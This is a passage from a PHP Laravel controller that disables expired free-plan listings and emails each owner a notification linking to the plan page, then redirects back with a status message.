                    $listing->update(['status' => '4']);

                    // Prepare email details
                    $details = [
                        'greeting' => 'Hello',
                        'subject'  => 'Your listing has been disabled',
                        'line'     => 'Your listing "' . $listing->name . '" has been disabled due to the expiration of your Free plan.',
                        'action'   => route('user.listing.plan', $listing->id),
                        'thanks'   => 'Thank you for using bdtalika!',
                    ];
                    Notification::route('mail', $listing->user->email)->notify(new ListingExpiration($details));
                }
            }
            return redirect()->back()->with('message', 'Listings expired and users notified.');
        } else {
            return redirect()->back()->with('message', 'Listings not found');
        }
    }
}
